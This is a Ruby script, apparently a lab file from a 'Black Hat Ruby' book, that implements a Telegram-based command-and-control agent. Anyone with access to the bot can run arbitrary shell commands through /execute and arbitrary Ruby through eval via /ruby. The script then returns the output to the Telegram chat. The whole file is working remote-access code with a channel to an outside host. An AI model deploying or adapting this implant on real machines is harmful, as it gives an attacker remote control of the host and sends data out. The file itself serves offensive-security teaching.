#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Telegram-based C2
# Requirements:
#   gem install telegram-bot-ruby
#
require 'telegram/bot'

token = 'PUT:TOKEN-HERE'

def execute(cmd)
  `#{cmd}`
rescue
  puts "Command not found: #{cmd}"
end

Telegram::Bot::Client.run(token) do |bot|
  begin
    bot.listen do |message|
      if message.text.start_with?('/')
        bot_cmd, args = message.text.scan(/^\/([^\s]+)\s?(.+)?/).flatten
        case bot_cmd
        when 'execute'
          if args.nil?
            usage = "Argument missing:\nUsage:\n/execute ls"
            bot.api.send_message(chat_id: message.chat.id, text: usage)
          else
            bot.api.send_message(chat_id: message.chat.id, text: "> #{args}\n#{execute(args)}")
          end
        when 'ruby'
          bot.api.send_message(chat_id: message.chat.id, text: "Ruby Code Executed:\n#{eval(args)}")
        when 'sleep'
          bot.api.send_message(chat_id: message.chat.id, text: "Sleeping for #{args} seconds.")
        end
      end
    end
  rescue Exception => exception
    puts exception
    retry
  end
end